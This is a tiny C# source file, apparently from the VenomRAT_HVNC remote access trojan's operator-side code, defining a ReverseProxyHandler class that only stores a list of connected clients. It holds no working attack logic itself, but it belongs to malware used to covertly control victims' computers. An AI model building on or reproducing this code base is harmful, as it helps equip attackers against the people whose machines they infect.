using Server;
using VenomRAT_HVNC.Server;

namespace VenomRAT_HVNC.Quasar.Server.Forms
{
    internal class ReverseProxyHandler
    {
        public ReverseProxyHandler(Client[] clients)
        {
            this.clients = clients;
        }

        private Client[] clients;
    }
}
